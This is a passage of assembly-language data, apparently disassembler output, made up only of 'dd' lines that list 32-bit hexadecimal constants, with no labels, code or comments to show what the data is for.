		dd 5FD2853Ah, 10502AD7h, 0C3EA0C87h, 41B60E87h,	0CEECB706h
		dd 0F43A8037h, 677A8391h, 0ED200613h, 0FFDC548Eh, 9997E6C2h
		dd 5C5C242Fh, 0FC395CDAh, 282A8C4Fh, 883E0F86h,	738AB2BEh
		dd 2AE2DDAFh, 5B25D52Eh, 4C90C326h, 0B0189A54h,	5A9FE831h
		dd 9D5EEC55h, 0AEBCF6A9h, 29B28902h, 6AEC7EE1h,	0A6FF256Dh
		dd 0B807EBB1h, 0A4F6F407h, 2B5C7033h, 733B95E9h, 9A5E98CBh
		dd 194645F6h, 1401834Ch, 2DC5F8A7h, 3D2CC8F2h, 42EAED36h
		dd 0D3F57834h, 0D9C969C5h, 319E2D16h, 0A76CBC5Bh, 0CFD39CF9h
		dd 0E0B462Eh, 0CE9A14Fh
		dd 5852A016h, 55C767FFh, 0E9ABF444h, 11E11C34h,	447B17E8h
		dd 0A5D7D238h, 4BA3413Bh, 284AFF6Ch, 0E2916796h, 2793114Dh
		dd 0F25E1B1Dh, 0D9B01DACh, 0AEB8A6ADh, 6C6960D6h, 16480DC1h
		dd 0E12E39B1h, 0B596CE5h, 17C181F3h, 649DF8D2h,	1D657527h
		dd 32C8755Eh, 4D5F6FF9h, 6D91D9D9h, 35604437h, 9A967309h
		dd 0A88E8EC5h, 628FECF6h, 4664DFDCh, 45682785h,	0E7BD14EDh
		dd 0D87F2569h, 0C09CF9F3h, 3234E290h, 2750C540h, 0B409B8Ah
		dd 0FE7C504Eh, 9C4691FBh, 8BA1171Dh, 32304DFEh,	0ADCCF22Eh
		dd 0CDE707D2h, 6FF99566h, 3FD292BDh, 24CBEA67h,	6610C719h
		dd 0B6CA2613h, 451E4828h, 5834FD02h, 0B1E2C6A8h, 3E413529h
		dd 96FCA82Eh, 5616EAF4h, 0E0B81D82h, 6C322496h,	901D3587h
		dd 0E2CD2CF8h, 0C79008BDh, 0EC62AA0Dh, 5005F8E3h, 56F9E9A7h
		dd 0BA7AE1A6h, 5EBFA11Eh, 6D585E64h, 0BCBADB05h, 33B05C16h
		dd 0C746D5D7h, 4AE5BEFh, 0C527A635h, 0CAB772FFh, 0B80845D0h
		dd 0C456A8C7h, 0B6D68A91h, 0D4FF664h, 5DA4BFF9h, 99DAC3Fh
		dd 0BA894ACFh, 2B7EBE5h, 4B725AE6h, 4B1D2CC3h, 30DDF688h
		dd 2C754E2Fh, 33392ECCh, 0D93C7D41h, 0AA137D09h, 4A2205D1h
		dd 0D89096DBh, 6838739Bh, 898A6BA7h, 8C41E4EBh,	0FB92FDFh
		dd 0C08A78D7h, 1631C22Ah, 4C16C97Eh, 0B740FC7Fh, 0CE3D828Dh
		dd 3B2F5697h, 0B59ACEE3h, 7349191Bh, 0D1DA838Dh, 4B90CF30h
		dd 0B46D5354h, 50108016h, 6856C949h, 0B44342E2h, 4EE788C1h
		dd 0B8A80626h, 745CEA0Ah, 0AD4A9D80h, 0F41C4C09h, 1DA3E0FAh
		dd 23BFF5D5h, 91353028h, 89646695h, 0D2C5FBA4h,	247028D5h
		dd 0F9A478DAh, 0E7D43333h, 0F822DD45h, 5EDC9031h, 0B8170F8Dh
		dd 9674F3Eh, 90AE1828h,	763CF1EBh, 66026B5Fh, 0FD351E29h
		dd 0E1CE9233h, 0DFECDC3Dh, 0D782F3B5h, 4B75E25h, 3F8D99ADh
		dd 3649FCFEh, 0D5000A4Dh, 90C4CCEDh, 758228BDh,	4E0F74EFh
		dd 9D325388h, 5ED194FDh, 0E2BF2DBCh, 0AF53CF54h, 0C1CF4AAFh
		dd 8763AD22h, 0FD77A36Dh, 63BB91AFh, 370520ABh,	0D9E4BF24h
		dd 0C88229B0h, 4C2E5BB5h, 379B880h, 5AA3AF14h, 0B73BEDA6h
		dd 5E9C8CDEh, 4E3E56C5h, 0A7E0A451h, 841ADEC0h,	0F9645B32h
		dd 2A08E399h, 0EC9A9C65h, 426601EAh, 0EFCCBC6Fh, 0DD22F4B7h
		dd 0F540B2AEh, 135128ABh, 69A270F1h, 0C1EB62E8h, 0D3AE7ADCh
		dd 0EC0CA1EFh, 6D696940h, 0BD17492Ah, 0F4719FA0h, 0D5FB8973h
		dd 0C6FA8E9h, 8795DE08h, 407979D5h, 824DE2A2h, 0FA686CA9h
		dd 0E7B08C21h, 0EEF07A22h, 5801B9C9h, 37CD721Bh, 0FFD7D85Dh
		dd 0D176550Fh, 35005EC8h, 0AA18A152h, 0E8647549h, 822C934Eh
		dd 93926CD9h, 0D813D91Bh, 0C1657C91h, 0C9069627h, 0A73B7018h
		dd 6170A5CFh, 0FE7BF6F5h, 4719017Eh, 181BD708h,	0FA5B57FBh
		dd 607BB527h, 0E3188285h, 0A7EAE401h, 72514C52h, 4C4C80F7h
		dd 38D7AFBDh, 615372EEh, 494AA445h, 0A7F4D171h,	5FD68C7Bh
		dd 0C0CAB617h, 481C4C46h, 4BF0B890h, 8C7D405Eh,	85100E31h
		dd 8A079F41h, 60AACB0Fh, 50F9CDF5h, 7360CC91h, 56AFDD4Bh
		dd 0BBA779E1h, 1AA44154h, 6E66AEF1h, 5848ECB2h,	0C7EEDEDFh
		dd 0C7479026h, 57D85E37h, 2BF97CC7h, 3EE9D8FFh,	0F03404FDh
		dd 3667483Dh, 226C2C33h, 2FD3C464h, 0AF6398C3h,	451A5E43h
		dd 0D144BF93h, 9D63DF44h, 358977F5h, 22A5A598h,	0AA5A2467h
		dd 8855F0D7h, 0F25CCE08h, 2E278E6Fh, 310A1A07h,	9C92B0A1h
		dd 8A2B825Fh, 0C401AEBFh, 5C73508Fh, 0F57D543Ah, 77153826h
		dd 0E32DAAE6h, 99C82AAEh, 9C1F5B3Bh, 0CF8E0FDFh, 0B1BE5BEEh
		dd 524BF682h, 7FF7BD43h, 0D3B746C5h, 0A4721652h, 0E115D842h
		dd 0C3AC43F0h, 0D8F75A3Dh, 2A4D306Ah, 0C6562931h, 6A8DACEBh
		dd 3B0D7CA1h, 338004E8h, 4CAC8E36h, 58B3A444h, 0DAFC0B89h
		dd 0E7451C81h, 0A1176624h, 0F2022266h, 7C14534Dh, 0D20EB94h
		dd 0A484B287h, 7E49D056h, 0E2AD41AFh, 0B15796A9h, 0C7996087h
		dd 0CCCC5A32h, 88ACA08Fh, 6FFDDFB1h, 0AF4CAB8h,	0D858EE1Bh
		dd 0BCAD685Fh, 1D6F6D44h, 0ADE14640h, 6EA61EE1h, 14AB99CDh
		dd 85EC3ACh, 0FB6B4E08h, 96B88128h, 2264B0B7h, 6B7C4F28h
		dd 40133FB2h, 3AFA3DC1h, 0D32A62h, 0D98A0036h, 20884590h
		dd 803D2AD0h, 37CBF970h, 0DD6584DCh, 377ABA37h,	12C07D8Dh
		dd 90490F71h, 0A60D8682h, 8593F6EBh, 196438C2h,	89F18B7h
		dd 399D7DE0h, 0FCF96C89h, 193A81F7h, 2DAD280Ch,	740FBFBAh
		dd 628A94DCh, 1EFEA9C2h, 10EEB1AEh, 43809CB6h, 119AEA5h
		dd 0AD84940Bh, 65693874h, 72D924B9h, 0D16A3A5Ch, 6D0DAF22h
		dd 0B30BD616h, 8067C77Bh, 0F8C2E32Dh, 33492DAFh, 90B4C36Dh
		dd 0F97C891h, 11909BEEh, 0D5E2C48Ch, 0F1566832h, 2101B301h
		dd 23B00533h, 0FA739D27h, 0D496E8A8h, 0E184CFFh, 1DBA096Ah
		dd 0BF0773D9h, 6DE1F59Fh, 7193FAB2h, 8D17DEE3h,	0A574D93Ch
		dd 6E4DB21Fh, 0E18AE134h, 0B3CA706Ah, 19FA1EC0h, 0EE2713C7h
		dd 0E88E2DAh, 7B78660Fh, 538F32E1h, 1339FA04h, 0E7C37B66h
		dd 0AC691CDCh, 3A49E0Ah, 1F1E0B94h, 31B5EE17h, 61108CA7h
		dd 8C76E8A7h, 6BD85A62h, 6A12866Dh, 5D8D0551h, 0AE170C15h
		dd 988200D2h, 9001588Eh, 0C3FCFC4Eh, 0C74B8F49h, 5817707Fh
		dd 0CC6A7464h, 0B457BDDh, 231EBD13h, 8D96F927h,	0BAD1460Bh
		dd 2C35353Dh, 8E7D92A1h, 0AC6CE22Bh, 72DF6E2h, 2C9DAA64h
		dd 0E7D0F5FAh, 0E3AAD985h, 0B5B68829h, 0A0B9CBEEh, 51FF5C2Bh
		dd 0C49F7F73h, 0E55C73DEh, 0B67F76C1h, 0E49BD1D7h, 737B8A34h
		dd 8C5F46B5h, 28469DF9h, 16FA8147h, 0CE37D69Ch,	1EB984D6h
		dd 0BC9EF5FFh, 164792DCh, 0B7790269h, 0D1D9EEA8h, 4C481373h
		dd 4117D13Bh, 2852D4E3h, 0AC5B0E96h, 219A8923h,	809E3F36h
		dd 9DB8DBCBh, 60A7ADFDh, 51182B51h, 48B7FC79h, 53FBCAE7h
		dd 0C8613A73h, 6E885EEBh, 0DB8F507Ch, 1AED992Fh, 620D74CCh
		dd 0C35F48BAh, 0C7B424A0h, 0CC93E9D4h, 0B18A3BB8h, 194A9C7Dh
		dd 74389127h, 0B7BE34EAh, 0C3D2A57Ah, 8465E9B7h, 0DC2ADA7Ah
		dd 7CCC0971h, 3AF981C2h, 90B6535Eh, 0AFA78F9Dh,	90F8A074h
		dd 0DD028EF4h, 866C471Bh, 202F4651h, 0D4D5F6EDh, 16458319h
		dd 8B21073Dh, 0E85C40E6h, 0C2908ABDh, 0DCF7601Dh, 6218D1AAh
		dd 0C8C95F94h, 0CDBEE944h, 99CA3CD5h, 6B43B0FEh, 0A835CE62h
		dd 98C21A42h, 0FDA24CC7h, 2D8D9F2Dh, 96180616h,	6B2A482Ah
		dd 4E47BFC5h, 22897DE8h, 259ACDD7h, 0DD6FA91Eh,	0B035A831h
		dd 9BD272ADh, 93749950h, 471AE0A9h, 0F9031B36h,	10334BB6h
		dd 590EFC1Bh, 0BA2F12CBh, 8DE84626h, 64B5209Eh,	0A357BD31h
		dd 0C3A17320h, 9A25B82h, 2DB97429h, 0E6DBC717h,	4A561308h
		dd 3CB9DB7Eh, 0CAE55674h, 1782BFB7h, 0C2F942F3h, 0BD0545C5h
		dd 1420F1BFh, 5A086431h, 67106B3Fh, 55A7F707h, 5616E8AAh
		dd 74C85337h, 285A8ADAh, 7151D086h, 74F56F04h, 9B388170h
		dd 681C5300h, 0A5C90A12h, 0A78C8963h, 0C17C7F2Fh, 75CAE309h
		dd 0A5D27D78h, 6B6AF53Eh, 87218CA6h, 0E7184D16h, 72A2DCB9h
		dd 194B348Ch, 0FE09CFFh, 0B0512046h, 2BC35653h,	75CF4687h
		dd 0AF44A51Bh, 51727AB0h, 0A5FB959Ch, 928A6AB7h, 0D0ADB9C1h
		dd 31BB21CBh, 126321F4h, 3B09DD2Bh, 0FB3784A6h,	395C10Ah
		dd 2DD176B7h, 0CD887EA5h, 0A957BCh, 6663B6Bh, 0F0A9805h
		dd 8ADA9719h, 0ADFDD56Fh
		dd 0DAFCD794h, 8776791Fh, 51004A80h, 0ED8B5E0Ah, 0EE70746Fh
		dd 62A02F1Fh, 0FB51527h, 983A39h, 0C5C5E21h, 82D8C0D7h
		dd 0B04D3399h, 6909BE36h, 1149D115h, 2EF037A7h,	13742E75h
		dd 5A4A1C2Eh, 5B2C511Eh, 28BE76DAh, 59860186h, 65A75D53h
		dd 3A2F0B50h, 337EB871h, 0A6D060A8h, 0E3519695h, 0F94DC60h
		dd 24A36841h, 97F1FA4Eh, 0DA7A1E46h, 9F65A31Dh,	9F8BA4E4h
		dd 8BBBA1DDh, 0CF9C9B18h, 955A7D7Eh, 885727FBh,	0A5DD6AE7h
		dd 33CBE110h, 1F1C696h,	55DC915Ah, 4505FDD3h, 0E908C3D7h
		dd 0B7C7FC86h, 0DCECA193h, 0D681AABAh, 673455A3h, 0E607F91Eh
		dd 8D6FC018h, 0D6215403h, 0FC90B3DBh, 0AF7125DCh, 8E0172E8h
		dd 0DA8CB5CAh, 4A5717Eh, 76FC0DA9h, 2A347B2Ah, 3E683B44h
		dd 47BB1BEBh, 0A5F26F3Dh, 3FDF1E17h, 0C9697B41h, 0A7290616h
		dd 0E0842D4Bh, 405B8A3Ch, 48A7E4ADh, 2BD2395h, 5D8C5EAFh
		dd 0EA9A6BCCh, 92C03BF7h, 0B32C0432h, 0AB303F04h, 3C87B79Fh
		dd 0CEA7A945h, 5DE27FA2h, 7BFE98Ch, 0EB6B97A3h,	4C0483F0h
		dd 70C6A27Ah, 0EE6CCAA2h, 0D446DD26h, 8A7117FAh, 4AB11678h
		dd 58DD3767h, 0AF54C034h, 0A17D52CBh, 2C2D7F9h,	124A476Eh
		dd 500F134Eh, 3EDC629h,	713D1741h, 0C53DD37Eh, 5D730876h
		dd 0A1B5B8BCh, 8A5B3C66h, 0F27C0F7h, 5260D3C8h,	5B34DE3Ch
		dd 63CB30C4h, 6869A699h, 7ADF4542h, 0D2AA5B25h,	0E1C92B42h
		dd 65C79D06h, 24E051BEh, 0A36FB22Dh, 0FD1808CCh, 0D7E27CC8h
		dd 7D34FA85h, 90F411DDh, 1542FD75h, 0F33E2779h,	0C67BEC87h
		dd 67077241h, 755EA34Dh, 3436F7E4h, 1DBFF81Ah, 0D0D1281Ah
		dd 993D7EE7h, 66A52BFh,	20C713FBh, 9EDD76D5h, 0E6A68E11h
		dd 6B208A61h, 476D0E3Bh, 12B0084Fh, 1685F018h, 0A03EE3ACh
		dd 72B0DCC5h, 5ECA7BF5h, 0B43F109h, 45106281h, 0C6156D82h
		dd 7CE08981h, 47133EB2h, 0BF1FE6A7h, 0B819E49Eh, 0F1B590F5h
		dd 0F17A0F6Eh, 0FFAF3BCDh, 0B5EC2566h, 4342BE6Eh, 8F59AF64h
		dd 4AFEFFC8h, 60043CAEh, 0F1812AA9h, 0B751B60Ah, 5ACA59A0h
		dd 0C56DA23Bh, 91DE4008h, 16662A88h, 0B125307Dh, 5E89B169h
		dd 0CB45888Bh, 895E2075h, 7AD6BFBAh, 57EE41A7h,	269736D8h
		dd 4C1CE4D2h, 0B024510Ah, 0B4669FEFh, 11FAE93Eh, 71C6E03Ah
		dd 89646BA6h, 92515461h, 0E20A9188h, 0F936EF95h, 0BE07400Bh
		dd 1B4620DDh, 95835042h, 6ABDC7EAh, 0C3779CF7h,	0AC2963F7h
		dd 2487EB64h, 31C0AC42h, 0F4A06811h, 26D846ABh,	1ADA9BB9h
		dd 0A3F55D06h, 86A622ECh, 53B460E5h, 3CD9A9Ch, 61C077ABh
		dd 35236BA1h, 0F28A2432h, 24A678h, 0FAA3D474h, 3FEBC0DEh
		dd 3A71902Ch, 0CC35917Ah, 3F435A46h, 0CFEF1258h, 27BC1974h
		dd 2AA2E8E9h, 62E6F8DEh, 0CABD4BAh, 15C16BDFh, 2F38961Bh
		dd 0B40C1145h, 9098BFC3h, 0D8A9A0AEh, 0EC4CB73Eh, 7A00F8h
		dd 0E2592034h, 0F4646B0Eh, 58FBD9D2h, 5F004762h, 0DA95960Fh
		dd 5C4B1DC7h, 561F477Ah, 5ECDC233h, 182439F4h, 3CD6DDFAh
		dd 1C7E4478h, 549096Ch,	1278EDADh, 0B7BBB023h, 2FF3A1E5h
		dd 0B733338Ah, 98BC24E6h, 6FC14223h, 5B7C7021h,	0BA46F3BFh
		dd 0D0028756h, 2AC834B7h, 0EDB014E6h, 852357B0h, 0B355C91Bh
		dd 0B5232936h, 0D2BD2B7Bh, 2978065Ch, 0CD5A2152h, 0F5A32679h
		dd 0CE5635F2h, 24696A86h, 9E0A1114h, 0C344FF4Dh, 684BBD59h
		dd 0F570DAE0h, 48B3E77Ah, 671E90FAh, 1CBFF6E2h,	0F77570DBh
		dd 524FECD2h, 0E69B003Fh, 0C7B33BE5h, 9570CA53h, 3611C224h
		dd 15C47BDAh, 0C0E0EE45h, 0F26E905Dh, 2A94BEC7h, 4B75067Dh
		dd 0F62A284Ah, 36DBD29Eh, 6D5DA44Eh, 65AA4022h,	0F772DE0Eh
		dd 0D56CBC4Eh, 879201E6h, 40AFB951h, 0D5CB7D81h, 3B7E7612h
		dd 995744BDh, 4B908548h, 2C242BCDh, 7A1BEA66h, 168596AEh
		dd 2E79F186h, 0BE3656EDh, 0F72355E6h, 7983E38Eh, 36D83C48h
		dd 61C9C96Fh, 77C06E11h, 0B51F6B3Dh, 0E0B48B1Ah, 364E2FC5h
		dd 42745F25h, 12E91CB7h, 71911FE4h, 0C8C5240Bh,	0A486825Bh
		dd 0B6B519EDh, 622E3537h, 6ED451B1h, 74A72B24h,	7A55354Eh
		dd 0E7F74935h, 0FF39CAD6h, 150350C3h, 0FB38EB3Bh, 65C33138h
		dd 35EB253Fh, 31D8964Ah, 7DCE9094h, 2A81F25Ah, 8EFCCBB5h
		dd 719955F9h, 46F8EFABh, 66E05037h, 0FFBA1474h,	0A77F9F08h
		dd 5822C5Bh, 0C1359794h, 4059A65Eh, 6B299636h, 0DB3C30A1h
		dd 7486EC9h, 0DAA5AAD9h, 4B0720A0h, 0CD4D8AFh, 1C61919Ah
		dd 590F824Ch, 0F9C9EB54h, 0E0B6A834h, 3CF7C333h, 0B811E28h
		dd 0ADFD7816h, 848B93F0h, 0CC964ED9h, 0D8A2138Ch, 60FA5CE5h
		dd 3BCD24DDh, 236C7F5h,	0CB199487h, 0DEBFF9A7h,	2E49B92Eh
		dd 7BB634A8h, 9A0E6D93h, 0EA092FF9h, 47A30810h,	3A8FDE2Fh
		dd 290A3088h, 5816F85Dh, 0A4B002DCh, 1F10BE8h, 38715ED7h
		dd 0B788C255h, 0CDEEF42Bh, 99096D55h, 3AF644BFh, 2105C18Dh
		dd 0AD6E5249h, 3428287Dh, 0A55EFAE9h, 0AE4DC4DDh, 0A3E661EFh
		dd 30DB9FA0h, 0E144AC5Ah, 5295DDC8h, 0B04FAC88h, 0F68310E9h
		dd 0B196A498h, 4ACB0411h, 9F120692h, 0C436D590h, 79F48120h
		dd 40DA18ADh, 17B7927Ah, 98E704AAh, 37B89098h, 3B7144BDh
		dd 0A8D3E186h, 0AAD5D780h, 427B3243h, 0B784D06Bh, 85F01171h
		dd 8C2EDFCAh, 9EB3F371h, 119EE57h, 2F2CEFCDh, 0D07FB001h
		dd 82178F99h, 0FA3E3584h, 0D19DB55h, 5D628E3Bh,	0A5FDE2C4h
		dd 42C9CF8Ah, 0E4A81050h, 692A2632h, 0EF45E183h, 37BBE779h
		dd 113E7BE8h, 6D4BA014h, 15937A4Dh, 531F7CCh, 27B82E7Fh
		dd 0DEAAD4E5h, 725618C4h, 1A943D89h, 84F8A07Ah,	0A0B957A6h
		dd 546120A3h, 5D07CFA3h, 2A9CADDBh, 0D11A6D2Fh,	88290640h
		dd 0ABD96252h, 0C17B1C7Eh, 539E9677h, 66548F0Dh, 0FF3D7011h
		dd 0A7EFE0CBh, 111CDC55h, 0EAC934F7h, 6E76389Bh, 0FE45AB5Eh
		dd 0D60B890Ch, 139B8350h, 460A19E8h, 6B8FFA22h,	870DEED1h
		dd 69036F57h, 3611EE71h, 4DD7C393h, 0E4536F48h,	0D4382453h
		dd 7CC22FFh, 0D7AC3B10h, 0A290F85Ch, 0D7167A6Eh, 0F8E28B94h
		dd 257AEDC9h, 742D4803h, 0A4F3A180h, 0C2C593F0h, 0A69ED709h
		dd 7676A6D7h, 0EC45A11Eh, 1CE61892h, 0D0027063h, 0D24C33D0h
		dd 0A0B56067h, 0F0B8C907h, 9024EF15h, 526100ADh, 0F74AD533h
		dd 660F50Eh, 33ABA9F1h,	0C7822324h, 0BDCFB10h, 21C6F6E5h
		dd 52C8F692h, 2AE77F5h,	879BD07Dh, 0D9807AA1h, 6E44EDA5h
		dd 3F205B25h, 54B77B04h, 98FC18FCh, 0DACBD328h,	4EC23702h
		dd 0C60D0FCEh, 0F3C3E2BAh, 5551D7CBh, 6368E131h, 502DF599h
		dd 0B72DF77Ch, 6DB5DD0Fh, 0BEBEB74Bh, 0A41767B3h, 5B64F8FFh
		dd 3C15481h, 0DA23440Fh, 0FA5E3FF2h, 83C3A331h,	0CAED48F5h
		dd 15389795h, 0BA21B019h, 0E349E27Eh, 115B4F09h, 0A02C5508h
		dd 284D95BCh, 4513F473h, 0B387ED72h, 5A5F50C4h,	879814D1h
		dd 0DFFB135Fh, 2AE167ADh, 2866E4F1h, 0D20391CDh, 59A296BCh
		dd 0E08A9BB0h, 3927D37Ch, 6B582C22h, 0C24F3E6Eh, 41719820h
		dd 7FA8C9A2h, 3D0180C6h, 9C826C7Bh, 0D6FDD368h,	9B139D99h
		dd 0EF7DF95Ch, 0E2935D36h, 0C5DAA29Ah, 0DB865FA0h, 0C79CB35Dh
		dd 0B3484D3Bh, 971716A3h, 345A1A06h, 0DD44C2E6h, 21C0B5B2h
		dd 65A469A8h, 0A5DBB8E7h, 932A3D4Ah, 68D6C969h,	6ECEAD87h
		dd 71E756B8h, 52FFD0FCh, 2CA99E7Eh, 0B4C7C220h,	3DCD148h
		dd 5977AA7Dh, 2DAEA41Fh
		dd 0DA8AD57Eh, 7ED31E0Fh, 0B0813F83h, 0D0AD8D6Ch, 3475EC46h
		dd 940E3B49h, 5950C30Ah, 2C94D3FAh, 7A8B5126h, 0E32FE63h
		dd 577CFDDh, 6774ACB2h,	5C15340Ch, 0C8B48957h, 0C240155Dh
		dd 30D29D91h, 0DF8B7291h, 0E7B7A6CCh, 7B3283DBh, 500B9908h
		dd 23DF5DDh, 26AFB355h,	7BD1B51h, 7F7A9D34h, 0D9242738h
		dd 0D86FB590h, 0C04573F1h, 0DE7C1401h, 0C54D6B4Fh, 0DD450E7Ah
		dd 2E4EC75Ah, 0C632EB96h, 7AD130E3h, 6303053Eh,	38F616AEh
		dd 0B8A58904h, 0F478A2EDh, 0E6F096A7h, 0A573E81h, 10FDD8CBh
		dd 2E7D80AEh, 4BC51CC0h, 0DD450D14h, 0B26579E2h, 0C577A8Fh
		dd 1254EB6h, 0DEAFF20Eh, 5EEA8C59h, 0E9219FE0h,	0C9316782h
		dd 0EBB02B64h, 0F0D5E684h, 2EC5C8ABh, 0ACBB4574h, 87462DB4h
		dd 0D7BE4373h, 0FDA0B1A3h, 0CB435655h, 0F4CDBA5Ch, 2ED61A85h
		dd 1000AAF0h, 8D3D0980h, 0D8895C65h, 9361D67Fh,	40B0A655h
		dd 8795D71Ah, 5995531Dh, 634ABAF9h, 398EC1B5h, 1D9D17E0h
		dd 43A06D0Ch, 37F2F0DAh, 1ECE47B3h, 20A84DE6h, 0ED17FD6Bh
		dd 0CBCBFD8h, 32D4D2A3h, 726D593Fh, 0B415A383h,	6154B1E1h
		dd 12678A04h, 24F6A51Eh, 0E50AAB37h, 0DE8518C1h, 2EFC7385h
		dd 50CAB7CBh, 705697DBh, 3720A718h, 8DDA11A2h, 95876419h
		dd 0C1F9773Fh, 0E94C6BB3h, 8BCE5AD7h, 9CA13E2Dh, 2959AF48h
		dd 0F84C0E5Dh, 1E437294h, 57F34C96h, 4FAAD459h,	0D5D86CB2h
		dd 5CBAEE4Ch, 49EF0BFDh, 2A7EF340h, 42741CBBh, 5B173C1Eh
		dd 0C881033h, 0FE0E6494h, 0BF3BB472h, 53EB7688h, 3E54E679h
		dd 85BEB10Fh, 44A150BEh, 284F6218h, 85A7F9E9h, 71E09141h
		dd 2A6331ECh, 48E3899Fh, 0F3D1541Dh, 9146F1A8h,	125957C1h
		dd 0A552B514h, 0C2F6F944h, 875ADD98h, 33C6D0D9h, 0A8E0468Ah
		dd 0EAD219E4h, 314095Ch, 0F84D9B9Bh, 0C3052211h, 0EF2EA711h
		dd 7301B9BBh, 266D4530h, 46615BD0h, 0A4DE2ADh, 7461B352h
		dd 97B8582Ch, 18A41247h, 0A03D273Bh, 0F66164EAh, 66182B7Dh
		dd 0B767077h, 92E34F64h, 0ADE0CF9Ah, 0E6656694h, 9292CD9Dh
		dd 0CA5842B2h, 61DFA138h, 122A9BEh, 5201A33Ch, 50FEF805h
		dd 7EA64304h, 0EB42B30Eh, 327C0B67h, 0B56CBA75h, 0AFF4ADDCh
		dd 5D52BC51h, 74FC0345h, 67D2F0F2h, 0B598C29Eh,	3A96542Bh
		dd 0CB86BA29h, 0BCB81E53h, 0A0A16749h, 7F5B0534h, 3501C5C0h
		dd 6FADD698h, 92549224h, 0B54C406Fh, 4579CE8Fh,	66E3059Ch
		dd 590E795h, 76443FE4h,	58B40E29h, 4918032Ah, 952D1391h
		dd 6EC9D1B1h, 0EB17B0B8h, 4BA5EF36h, 3C13A794h,	912C5EB5h
		dd 0D14DF4C8h, 62754C76h, 8D9778A6h, 9214DD4Ah,	525EF7DCh
		dd 0C1CCB2F3h, 0B5868B09h, 906B57DAh, 4F5E1B62h, 0DECAEBEh
		dd 7984C678h, 6650A5E0h, 2DBC061Fh, 84AE7A5h, 0DDFC26F6h
		dd 1B491543h, 296A1726h, 649D6DBCh, 0C157655Bh,	7A1A4C03h
		dd 41097E41h, 897316B9h, 0F512C53h, 0AA68D5DFh,	32F8D3E7h
		dd 0F4054A90h, 1ABDAD7Eh, 0CF294D0Ch, 0BB61A63h, 0EE543A80h
		dd 52134F7Fh, 0BD39818Fh, 21E94203h, 7481E166h,	2DC27701h
		dd 40C82E12h, 1514732Fh, 6C3FE63Fh, 0A0F4574Bh,	65290E47h
		dd 97014C28h, 0ED062885h, 13D444D9h, 0A0ADC035h, 0C063DE7Eh
		dd 0E8345C76h, 0E8519406h, 0AFAA16CEh, 22422AE9h, 203D1674h
		dd 0E5218103h, 8DF3B886h, 9780D5F9h, 4835C9D0h,	37260C9Ah
		dd 0BDF15693h, 98D23686h, 0B9CDCAA0h, 886881F4h, 93B7D564h
		dd 0D2A90505h, 0B81AFD47h, 14C24FCDh, 0F82550D5h, 4BA8995Ch
		dd 0A1A4ACFDh, 0A605F54Ch, 95B470D2h, 0A24F934Dh, 1254BF1Ah
		dd 741E5275h, 79DD9198h, 46458284h, 3B4797A9h, 0E2DA4EBFh
		dd 8F58AC64h, 8F3F8082h, 0D62BAA42h, 0A97D989Fh, 1328F231h
		dd 0D6F885B1h, 0D57AA95h, 0A8971B48h, 0DF68B73Fh, 82F1D1FBh
		dd 6FF24D6Dh, 0BB624082h, 48FE2799h, 0A59C6h, 0FBB77C62h
		dd 528637B9h, 0F986BCA9h, 0BB6C9916h, 0C3D2FB3Dh, 0ACBBFF7Ch
		dd 0D2A023FAh, 31F00A09h, 575F75CBh, 898D2FE2h,	70CE1A8Ch
		dd 8ED3DBF8h, 517A81FBh, 32558B66h, 20161C6h, 9C40E931h
		dd 81080572h, 0AA87C769h, 9EEAFE4h, 0D533141Ch,	47A26EA4h
		dd 892B28C0h, 12A7CC4Fh, 0C97446C3h, 2D741C69h,	7CA52D06h
		dd 23194501h, 0C97F1202h, 0BE1B3EC7h, 8A9FBC58h, 5A3C754h
		dd 6EA1A7B1h, 5928CC9Fh, 9EF4438Ch, 0D5817BC8h,	5411905Dh
		dd 22A06656h, 3A7FC3B7h, 62FEC83Bh, 1A1846A2h, 14C05D3Ah
		dd 0E9EF1F62h, 7362C35Fh, 0C1255343h, 0D51A6D0Ah, 562958C7h
		dd 4FC69197h, 801D46CDh, 0DD1488FCh, 9CA1D804h,	0A529DD6Dh
		dd 0A45BCBD4h, 0BCD57960h, 1EC062B0h, 0BCB2A8DDh, 45EE981Eh
		dd 0D623F1A7h, 4125067Ah, 0E4C1C4Ah, 4DA3DE5Ah,	28FD4E3Ch
		dd 4ED63BBCh, 9AA15774h, 56A6911h, 41208779h, 0B0443C20h
		dd 85E19135h, 22661BCAh, 61384E46h, 88DA8CD1h, 5C57F5BCh
		dd 8D57BA30h, 4DA787A0h, 13D1539Dh, 0EA827BE6h,	0E26BBEABh
		dd 9EC413DBh, 0B070ADC1h, 0A1964147h, 6B5E0002h, 0EDEEE90h
		dd 41A3AA1Fh, 0F7183EB6h, 7DA661C8h, 3D342A7Bh,	0A6C1F26Fh
		dd 5564F33h, 0E33F3D89h, 3E4EBD2Eh, 1780CD61h, 0DA5CAD94h
		dd 0A4AA5D90h, 0B7B4677Ch, 7C6C7633h, 0CB24AB12h, 0F11905B0h
		dd 1E938A35h, 0FB14D59h, 2C8425D1h, 5B36483Fh, 0E2BBE978h
		dd 820B106Bh, 0D629E87h, 704FF9D9h, 199F3190h, 4500CFD9h
		dd 43DA61B2h, 971C862Ah, 6850651Fh, 3AEA3957h, 0E7EC11B6h
		dd 0C03C2924h, 0D555D426h, 0D82A78Eh, 51E3B52Fh, 0A22EB1FDh
		dd 2A3EF785h, 1E88FC15h, 439ED3C5h, 0E760D395h,	2F9036F1h
		dd 65E4269Eh, 61778A70h, 0ED3944CDh, 0C4C6DABDh, 0DBCF940Bh
		dd 0A10036D4h, 7A8B8F6Ch, 943345C4h, 0E61A9421h, 656F5850h
		dd 4FE9DC55h, 24801A87h, 9FEB9D27h, 60DCC0D3h, 0F2F73AECh
		dd 3828161Ah, 0DB563DA0h, 929AE409h, 0A46F34D7h, 0C9D0D9EAh
		dd 7268B0F6h, 2AB50ACEh, 8ECF1466h, 6F11244Bh, 9E48B3DEh
		dd 0FA2E2139h, 141F9EDh, 335A193Ch, 0DE8E5B26h,	5D48B96Bh
		dd 2D78BEC4h, 590EDC9Ch, 8900B063h, 7677E90Fh, 686B5F6h
		dd 0CFA6AD55h, 823C39D9h, 1870EF93h, 0DA6C3E96h, 0FF1166BFh
		dd 0E84CDC82h, 12AA50Ch, 4C0869C1h, 0EAEB384Ah,	0C2634541h
		dd 4704AD34h, 0D812AD00h, 7901FDCh, 5EA4FD99h, 5463CFCBh
		dd 0B3004049h, 0CA1158D8h, 5479873Bh, 0F76251DCh, 455B48DFh
		dd 0DD868E3Dh, 0AD87A2Bh, 4768548Ch, 7DF6C81h, 82644B2Ah
		dd 0C931D471h, 0AA7ECECAh, 26B7927h, 0E430819Ah, 860F8696h
